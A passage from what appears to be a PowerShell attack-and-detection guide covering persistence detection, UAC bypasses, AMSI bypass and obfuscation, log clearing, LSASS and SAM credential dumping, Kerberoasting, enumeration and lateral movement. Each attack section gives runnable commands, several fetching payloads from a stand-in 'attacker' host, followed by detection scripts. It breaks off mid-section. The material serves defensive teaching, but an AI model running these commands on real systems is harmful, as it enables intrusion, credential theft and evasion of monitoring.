# List WMI event subscriptions
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding

# Look for CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
    Select-Object Name, CommandLineTemplate
```

#### Detection Script

{% code overflow="wrap" %}
```powershell
# Persistence Detection Script
Write-Host "=== PowerShell Persistence Detection ===" -ForegroundColor Yellow

# Registry Run Keys
Write-Host "`n[1] Registry Run Keys with PowerShell:" -ForegroundColor Cyan
$runKeys = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)
foreach ($key in $runKeys) {
    Get-ItemProperty -Path $key -ErrorAction SilentlyContinue | 
        ForEach-Object { $_.PSObject.Properties | Where-Object { $_.Value -match 'powershell|pwsh|\.ps1' } }
}

# Scheduled Tasks
Write-Host "`n[2] Scheduled Tasks with PowerShell:" -ForegroundColor Cyan
Get-ScheduledTask | ForEach-Object {
    $_.Actions | Where-Object { $_.Execute -match 'powershell|pwsh' -or $_.Arguments -match '\.ps1' } |
        ForEach-Object { $_ }
} | Select-Object -First 10

# WMI Subscriptions
Write-Host "`n[3] WMI Event Subscriptions:" -ForegroundColor Cyan
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
    Select-Object Name, CommandLineTemplate

# Startup Folders
Write-Host "`n[4] Startup Folder Contents:" -ForegroundColor Cyan
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -ErrorAction SilentlyContinue
Get-ChildItem "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" -ErrorAction SilentlyContinue

# Services with PowerShell
Write-Host "`n[5] Services with PowerShell in Path:" -ForegroundColor Cyan
Get-WmiObject Win32_Service | Where-Object { $_.PathName -match 'powershell|pwsh' } |
    Select-Object Name, PathName

Write-Host "`n=== Detection Complete ===" -ForegroundColor Yellow
```
{% endcode %}

***

## Phase 6: Privilege Escalation

### Attack Techniques

#### UAC Bypass Methods

{% code overflow="wrap" %}
```powershell
# Fodhelper bypass (Windows 10)
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "powershell.exe -ep bypass -c IEX(...)"
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
Start-Process fodhelper.exe
# Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force

# ComputerDefaults bypass
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "cmd.exe /c powershell.exe"
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
Start-Process ComputerDefaults.exe

# Event Viewer bypass
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(Default)" -Value "powershell.exe -ep bypass -c IEX(...)"
Start-Process eventvwr.exe
```
{% endcode %}

#### Token Manipulation

```powershell
# Get current token privileges
whoami /priv

# Enable SeDebugPrivilege (if available)
# Requires loading native APIs or tools like PowerSploit

# Token impersonation (requires elevated privileges)
# Using PowerSploit/PowerView
# Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId <PID>

# Named pipe impersonation
# Impersonate clients connecting to named pipe
```

#### Service Exploitation

{% code overflow="wrap" %}
```powershell
# Find unquoted service paths
Get-WmiObject Win32_Service | 
    Where-Object { $_.PathName -match '^[^"].*\s.*\.exe' -and $_.StartMode -eq 'Auto' } |
    Select-Object Name, PathName, StartMode

# Find services with weak permissions
# Get service binary permissions
Get-WmiObject Win32_Service | ForEach-Object {
    $path = $_.PathName -replace '"','' -replace '\s.*',''
    if (Test-Path $path) {
        $acl = Get-Acl $path
        if ($acl.Access | Where-Object { $_.FileSystemRights -match 'Write|FullControl' -and $_.IdentityReference -match 'Users|Everyone' }) {
            [PSCustomObject]@{Service=$_.Name; Path=$path; Permissions=$acl.Access}
        }
    }
}

# Modify service binary
# If we have write access to service binary, replace it

# Service permission abuse
# If we can modify service configuration
sc.exe config VulnService binpath= "powershell.exe -c IEX(...)"
Restart-Service VulnService
```
{% endcode %}

#### AlwaysInstallElevated

{% code overflow="wrap" %}
```powershell
# Check if AlwaysInstallElevated is enabled
$hklm = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
$hkcu = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue

if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
    Write-Host "AlwaysInstallElevated is enabled - vulnerable!" -ForegroundColor Red
    # Create malicious MSI and install
    # msiexec /i malicious.msi /quiet
}
```
{% endcode %}

#### DLL Hijacking

{% code overflow="wrap" %}
```powershell
# Find DLL hijacking opportunities
# Check for missing DLLs in PATH
# Use Process Monitor to find DLL search order issues

# Common hijack locations
$paths = @(
    $env:PATH -split ';' | Where-Object { $_ -ne '' }
)
foreach ($path in $paths) {
    $acl = Get-Acl $path -ErrorAction SilentlyContinue
    if ($acl.Access | Where-Object { $_.FileSystemRights -match 'Write|FullControl' -and $_.IdentityReference -match 'Users|Everyone' }) {
        Write-Host "Writable PATH: $path" -ForegroundColor Red
    }
}
```
{% endcode %}

### Detection Strategies

#### UAC Bypass Detection

```powershell
# Monitor registry keys used for UAC bypass
$uacKeys = @(
    "HKCU:\Software\Classes\ms-settings\shell\open\command",
    "HKCU:\Software\Classes\mscfile\shell\open\command",
    "HKCU:\Software\Classes\exefile\shell\open\command"
)
foreach ($key in $uacKeys) {
    $val = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
    if ($val) { 
        Write-Host "Suspicious key found: $key" -ForegroundColor Red
        $val 
    }
}

# Event logs for UAC bypass
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} |
    Where-Object { $_.Message -match 'fodhelper|eventvwr|computerdefaults' }
```

#### Token Detection

```powershell
# Processes with elevated tokens
Get-Process | ForEach-Object {
    try {
        $elevated = (New-Object Security.Principal.WindowsPrincipal(
            [Security.Principal.WindowsIdentity]::GetCurrent($_.SafeHandle)
        )).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
        if ($elevated) { $_ }
    } catch {}
}
```

#### Detection Script

{% code overflow="wrap" %}
```powershell
# Privilege Escalation Detection Script
Write-Host "=== Privilege Escalation Detection ===" -ForegroundColor Yellow

# UAC bypass registry keys
Write-Host "`n[1] UAC Bypass Registry Keys:" -ForegroundColor Cyan
$uacKeys = @(
    "HKCU:\Software\Classes\ms-settings",
    "HKCU:\Software\Classes\mscfile",
    "HKCU:\Software\Classes\exefile"
)
foreach ($key in $uacKeys) {
    if (Test-Path "$key\shell\open\command") {
        Write-Host "Suspicious: $key" -ForegroundColor Red
        Get-ItemProperty "$key\shell\open\command" -ErrorAction SilentlyContinue
    }
}

# Unquoted service paths
Write-Host "`n[2] Unquoted Service Paths:" -ForegroundColor Cyan
Get-WmiObject Win32_Service | 
    Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match '\s' } |
    Select-Object Name, PathName | Format-Table -AutoSize

# AlwaysInstallElevated
Write-Host "`n[3] AlwaysInstallElevated Check:" -ForegroundColor Cyan
$hklm = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
$hkcu = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($hklm -eq 1 -and $hkcu -eq 1) { Write-Host "VULNERABLE: AlwaysInstallElevated enabled" -ForegroundColor Red }

# Writable service paths
Write-Host "`n[4] Writable Service Binaries:" -ForegroundColor Cyan
Get-WmiObject Win32_Service | ForEach-Object {
    $path = ($_.PathName -replace '"','') -replace '\s-.*$','' -replace '\s/.*$',''
    if ($path -and (Test-Path $path)) {
        $acl = Get-Acl $path -ErrorAction SilentlyContinue
        $writable = $acl.Access | Where-Object { 
            $_.FileSystemRights -match 'Write|FullControl|Modify' -and 
            $_.IdentityReference -match 'Users|Everyone|Authenticated' 
        }
        if ($writable) { Write-Host "Writable: $path ($($_.Name))" -ForegroundColor Red }
    }
}

Write-Host "`n=== Detection Complete ===" -ForegroundColor Yellow
```
{% endcode %}

***

## Phase 7: Defense Evasion

### Attack Techniques

#### Obfuscation Methods

{% code overflow="wrap" %}
```powershell
# String concatenation
$a = 'IEX'; $b = '(New-Object Net.WebClient).DownloadString'; &($a) (&($b)("http://attacker/payload.ps1"))

# Character substitution
$url = [char]104+[char]116+[char]116+[char]112  # "http"

# Variable substitution
$wc = New-Object Net.WebClient
$url = "http://attacker/payload.ps1"
$wc."DownloadString"($url) | IEX

# Tick marks (escape character)
I`E`X (N`ew-Obj`ect N`et.WebC`lient).Down`loadStr`ing('http://attacker/payload.ps1')

# Base64 encoding
$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process'))
powershell -EncodedCommand $cmd

# SecureString obfuscation
$ss = ConvertTo-SecureString "IEX(..." -AsPlainText -Force
[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($ss)) | IEX

# Format string obfuscation
$a = "{0}{1}{2}" -f 'Inv','oke-Exp','ression'
&($a) "Get-Process"

# Invoke-Obfuscation tool output styles
# Token, String, Encoding, Launcher obfuscation
```
{% endcode %}

#### Logging Evasion

{% code overflow="wrap" %}
```powershell
# Disable PowerShell logging (requires admin)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0

# Clear PowerShell event logs
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Windows PowerShell"
Clear-EventLog -LogName "Windows PowerShell"

# Downgrade to PowerShell v2 (no script block logging)
powershell.exe -Version 2 -Command "Get-Host"

# Execute in constrained runspace (may bypass some monitoring)
$rs = [runspacefactory]::CreateRunspace()
$rs.Open()
$pipeline = $rs.CreatePipeline()
$pipeline.Commands.AddScript("Get-Process")
$pipeline.Invoke()
```
{% endcode %}

#### AMSI Bypass Techniques

{% code overflow="wrap" %}
```powershell
# Memory patching (commonly detected)
# Reflection-based (educational - usually blocked)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Using unmanaged code
$code = @"
using System;
using System.Runtime.InteropServices;
public class Bypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
# Note: Modern AV/EDR will detect and block these attempts
```
{% endcode %}

#### Process Injection

```powershell
# Shellcode injection (using .NET/Win32 APIs)
# CreateRemoteThread, NtCreateThreadEx, QueueUserAPC, etc.

# Reflective DLL injection
# Load DLL entirely in memory without touching disk

# Process hollowing
# Replace legitimate process memory with malicious code

# These techniques typically require:
# - Add-Type with P/Invoke declarations
# - Direct Win32 API calls
# - Usually detected by modern EDR
```

#### Living Off the Land

{% code overflow="wrap" %}
```powershell
# Use legitimate Windows tools
# MSBuild
MSBuild.exe payload.csproj

# MSHTA
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell ..."", 0:close")

# Regsvr32
regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll

# Rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell...")

# Certutil
certutil -urlcache -split -f http://attacker/payload.exe C:\temp\payload.exe

# Bitsadmin
bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\temp\payload.exe
```
{% endcode %}

### Detection Strategies

#### Obfuscation Detection

{% code overflow="wrap" %}
```powershell
# Look for obfuscation indicators in script blocks
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object { 
        $_.Message -match '\[char\]|\[Convert\]::FromBase64|`|{0}.*-f|SecureStringToBSTR|\$\(\)|replace' 
    }

# High entropy commands (likely encoded)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object { $_.Message.Length -gt 500 -and ($_.Message -match '^\s*[A-Za-z0-9+/=]+\s*$') }
```
{% endcode %}

#### Logging Evasion Detection

{% code overflow="wrap" %}
```powershell
# Check if logging is disabled
$sbl = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue
$trans = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue
if ($sbl.EnableScriptBlockLogging -eq 0) { Write-Host "Script Block Logging DISABLED" -ForegroundColor Red }
if ($trans.EnableTranscripting -eq 0) { Write-Host "Transcription DISABLED" -ForegroundColor Red }

# Detect log clearing
Get-WinEvent -FilterHashtable @{LogName='Security';Id=1102}  # Security log cleared
Get-WinEvent -FilterHashtable @{LogName='System';Id=104}     # Other log cleared

# Detect PS v2 usage
Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell';Id=400} |
    Where-Object { $_.Message -match 'EngineVersion=2' }
```
{% endcode %}

#### Detection Script

{% code overflow="wrap" %}
```powershell
# Defense Evasion Detection Script
Write-Host "=== Defense Evasion Detection ===" -ForegroundColor Yellow

# Obfuscated commands
Write-Host "`n[1] Obfuscated Commands Detected:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match '\[char\]|`.|{[0-9]}.*-f|FromBase64' } |
    Select-Object TimeCreated, @{N='Snippet';E={$_.Message.Substring(0,[Math]::Min(200,$_.Message.Length))}} |
    Format-Table -AutoSize

# Logging disabled
Write-Host "`n[2] Logging Configuration:" -ForegroundColor Cyan
$sbl = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue).EnableScriptBlockLogging
$trans = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue).EnableTranscripting
Write-Host "Script Block Logging: $(if($sbl -eq 1){'Enabled'}else{'DISABLED/Not Set'})"
Write-Host "Transcription: $(if($trans -eq 1){'Enabled'}else{'DISABLED/Not Set'})"

# PowerShell v2 usage
Write-Host "`n[3] PowerShell v2 Usage (Downgrade Attack):" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell';Id=400} -MaxEvents 100 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'EngineVersion=2' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# AMSI bypass attempts
Write-Host "`n[4] AMSI Bypass Indicators:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'AmsiUtils|amsiInitFailed|amsi\.dll|AmsiScanBuffer' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# LOLBins usage
Write-Host "`n[5] LOLBins with PowerShell:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 500 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'mshta|regsvr32|rundll32|certutil|msbuild' -and $_.Message -match 'powershell' } |
    Select-Object TimeCreated, @{N='Process';E={($_.Message -split "New Process Name:")[1].Split("`n")[0]}} |
    Format-Table -AutoSize

Write-Host "`n=== Detection Complete ===" -ForegroundColor Yellow
```
{% endcode %}

***

## Phase 8: Credential Access

### Attack Techniques

#### Mimikatz via PowerShell

{% code overflow="wrap" %}
```powershell
# Invoke-Mimikatz (PowerSploit)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"lsadump::sam"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:Administrator"'

# Dump credentials
Invoke-Mimikatz -DumpCreds

# Export Kerberos tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Golden ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:<hash> /ptt"'
```
{% endcode %}

#### SAM/SYSTEM Dump

```powershell
# Registry dump (requires admin)
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
reg save HKLM\SECURITY C:\temp\security

# Shadow copy method
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# ntdsutil for DC
ntdsutil "activate instance ntds" "ifm" "create full C:\temp" quit quit

# Using PowerShell
$bootKey = Get-BootKey
$sam = Get-SAMHash -BootKey $bootKey
```

#### LSASS Dump

{% code overflow="wrap" %}
```powershell
# Task Manager method (manual)
# Right-click lsass.exe > Create dump file

# Procdump
procdump.exe -ma lsass.exe lsass.dmp

# Rundll32 method
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# PowerShell method
$proc = Get-Process lsass
$path = "C:\temp\lsass.dmp"
[System.Diagnostics.Process]::GetProcessById($proc.Id).MinidumpWriteDump($path)

# Out-Minidump (PowerSploit)
Get-Process lsass | Out-Minidump
```
{% endcode %}

#### Credential Harvesting

{% code overflow="wrap" %}
```powershell
# Credential Manager
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }

# cmdkey
cmdkey /list

# Browser credentials (requires tools)
# Chrome, Firefox, Edge stored passwords

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Find credentials in files
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config,*.xml -Recurse -ErrorAction SilentlyContinue | 
    Select-String -Pattern "password|passwd|pwd|secret|credential" -List

# Group Policy Preferences (GPP) passwords
Get-ChildItem -Path "\\domain.com\SYSVOL" -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue |
    Select-String -Pattern "cpassword" | ForEach-Object { $_.Line }
```
{% endcode %}

#### Kerberos Attacks

{% code overflow="wrap" %}
```powershell
# Kerberoasting
# Using PowerView/Rubeus
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat

# Using built-in methods
Add-Type -AssemblyName System.IdentityModel
$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.domain.com:1433"
$ticket.GetRequest()

# AS-REP Roasting
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
# Then request TGT without pre-auth

# Pass the Ticket
# Import ticket and use
klist
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
```
{% endcode %}

### Detection Strategies

#### Credential Dumping Detection

```powershell
# LSASS access
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4663} |
    Where-Object { $_.Message -match 'lsass' }

# Process creation for credential tools
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} |
    Where-Object { $_.Message -match 'procdump|mimikatz|lsass.*dmp' }

# Registry access to SAM/SYSTEM
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4656} |
    Where-Object { $_.Message -match 'SAM|SYSTEM|SECURITY' }

# Kerberoasting indicators
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} |
    Where-Object { $_.Message -match '0x17' }  # RC4 encryption
```

#### Detection Script

{% code overflow="wrap" %}
```powershell
# Credential Access Detection Script
Write-Host "=== Credential Access Detection ===" -ForegroundColor Yellow

# LSASS access
Write-Host "`n[1] LSASS Access Events:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4663} -MaxEvents 100 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'lsass\.exe' } |
    Select-Object TimeCreated, @{N='Details';E={$_.Message.Substring(0,200)}} | Format-Table -AutoSize

# Mimikatz indicators in logs
Write-Host "`n[2] Mimikatz/Credential Tool Indicators:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'mimikatz|sekurlsa|lsadump|kerberos::' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# SAM/SYSTEM registry access
Write-Host "`n[3] Registry Credential Access:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4656,4663} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match '\\SAM|\\SYSTEM|\\SECURITY' } |
    Select-Object TimeCreated, Id | Format-Table -AutoSize

# Kerberoasting (TGS requests with RC4)
Write-Host "`n[4] Kerberoasting Indicators (RC4 TGS):" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match '0x17|0x18' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# Shadow copy creation
Write-Host "`n[5] Shadow Copy Events:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'vssadmin|ntdsutil' } |
    Select-Object TimeCreated, @{N='Process';E={($_.Message -split "Process Command Line:")[1].Split("`n")[0]}}

Write-Host "`n=== Detection Complete ===" -ForegroundColor Yellow
```
{% endcode %}

***

## Phase 9: Discovery

### Attack Techniques

#### System Enumeration

{% code overflow="wrap" %}
```powershell
# System information
systeminfo
Get-ComputerInfo
[System.Environment]::OSVersion
Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber

# Current user
whoami
whoami /all
[System.Security.Principal.WindowsIdentity]::GetCurrent()

# Local users
Get-LocalUser
Get-WmiObject Win32_UserAccount | Select-Object Name, SID, Disabled

# Local groups
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
net localgroup Administrators

# Processes
Get-Process | Select-Object Name, Id, Path
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Services
Get-Service
Get-WmiObject Win32_Service | Select-Object Name, State, PathName

# Installed software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate

# Hotfixes/patches
Get-HotFix
wmic qfe list

# Environment variables
Get-ChildItem Env:
[Environment]::GetEnvironmentVariables()

# Drives
Get-PSDrive -PSProvider FileSystem
Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace
```
{% endcode %}

#### Network Enumeration

{% code overflow="wrap" %}
```powershell
# Network configuration
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# Routing
Get-NetRoute
route print

# ARP table
Get-NetNeighbor
arp -a

# Connections
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
netstat -ano

# DNS
Get-DnsClientCache
Get-DnsClientServerAddress

# Firewall rules
Get-NetFirewallRule | Where-Object { $_.Enabled -eq $true }
netsh advfirewall firewall show rule name=all

# Shares
Get-SmbShare
net share

# Network shares
Get-SmbConnection
net use
```
{% endcode %}

#### Active Directory Enumeration

{% code overflow="wrap" %}
```powershell
# Domain users
Get-ADUser -Filter * -Properties *
net user /domain

# Domain groups
Get-ADGroup -Filter *
net group /domain

# Domain admins
Get-ADGroupMember "Domain Admins" -Recursive

# Domain computers
Get-ADComputer -Filter * -Properties OperatingSystem

# Domain controllers
Get-ADDomainController -Filter *

# GPOs
Get-GPO -All

# OUs
Get-ADOrganizationalUnit -Filter *

# Trusts
Get-ADTrust -Filter *

# LAPS
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd

# Password policy
Get-ADDefaultDomainPasswordPolicy
net accounts /domain
```
{% endcode %}

### Detection Strategies

#### Log Analysis

{% code overflow="wrap" %}
```powershell
# Enumeration commands in logs
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object { $_.Message -match 'Get-AD|Get-Local|systeminfo|whoami|Get-Process|Get-Service' }

# Mass enumeration (many commands in short time)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Group-Object { $_.TimeCreated.ToString("yyyy-MM-dd HH:mm") } |
    Where-Object { $_.Count -gt 20 }
```
{% endcode %}

#### Detection Script

{% code overflow="wrap" %}
```powershell
# Discovery Detection Script
Write-Host "=== Discovery Activity Detection ===" -ForegroundColor Yellow

# System enumeration commands
Write-Host "`n[1] System Enumeration Activity:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'systeminfo|Get-ComputerInfo|Get-LocalUser|Get-LocalGroup|Get-Process|Get-Service|whoami' } |
    Select-Object TimeCreated, @{N='Command';E={($_.Message -split "`n")[0].Substring(0,100)}} | Format-Table -AutoSize

# Network enumeration
Write-Host "`n[2] Network Enumeration Activity:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'Get-NetIP|Get-NetTCP|Get-NetRoute|Get-NetNeighbor|ipconfig|netstat|arp' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# AD enumeration
Write-Host "`n[3] AD Enumeration Activity:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'Get-ADUser|Get-ADGroup|Get-ADComputer|Get-ADDomain|net user|net group' } |
    Select-Object TimeCreated | Format-Table -AutoSize

Write-Host "`n=== Detection Complete ===" -ForegroundColor Yellow
```
{% endcode %}

***

## Phase 10: Lateral Movement

### Attack Techniques

#### PowerShell Remoting

{% code overflow="wrap" %}
```powershell
# Enable remoting
Enable-PSRemoting -Force

# Enter interactive session
Enter-PSSession -ComputerName target.domain.com -Credential domain\admin

# Execute command remotely
Invoke-Command -ComputerName target.domain.com -ScriptBlock { Get-Process } -Credential domain\admin

# Execute on multiple targets
Invoke-Command -ComputerName server1,server2,server3 -ScriptBlock { hostname }

# Session-based
$session = New-PSSession -ComputerName target.domain.com -Credential domain\admin
Invoke-Command -Session $session -ScriptBlock { Get-Process }
Enter-PSSession -Session $session

# Copy files via session
Copy-Item -Path C:\local\file.exe -Destination C:\remote\ -ToSession $session
Copy-Item -Path C:\remote\file.exe -Destination C:\local\ -FromSession $session

# Pass the hash with remoting (requires Mimikatz or similar)
# Use Invoke-Mimikatz to inject credentials, then PSRemoting works
```
{% endcode %}

#### WMI Execution

{% code overflow="wrap" %}
```powershell
# Execute command via WMI
Invoke-WmiMethod -ComputerName target.domain.com -Class Win32_Process -Name Create -ArgumentList "powershell.exe -ep bypass -c Get-Process" -Credential domain\admin

# Using CIM
$cimSession = New-CimSession -ComputerName target.domain.com -Credential domain\admin
Invoke-CimMethod -CimSession $cimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell.exe -c Get-Process"}

# WMI event subscription for persistence (see Phase 5)
```
{% endcode %}

#### SMB Execution

```powershell
# Copy file to admin share
Copy-Item -Path C:\local\payload.exe -Destination \\target\C$\Windows\Temp\

# Create service
sc.exe \\target create RemoteSvc binpath= "C:\Windows\Temp\payload.exe"
sc.exe \\target start RemoteSvc

# PsExec style (using Impacket or similar)
# Or create scheduled task via SMB
```

#### DCOM Execution

{% code overflow="wrap" %}
```powershell
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target.domain.com"))
$com.Document.ActiveView.ExecuteShellCommand("powershell.exe",0,"-ep bypass -c IEX(...)","")

# ShellWindows
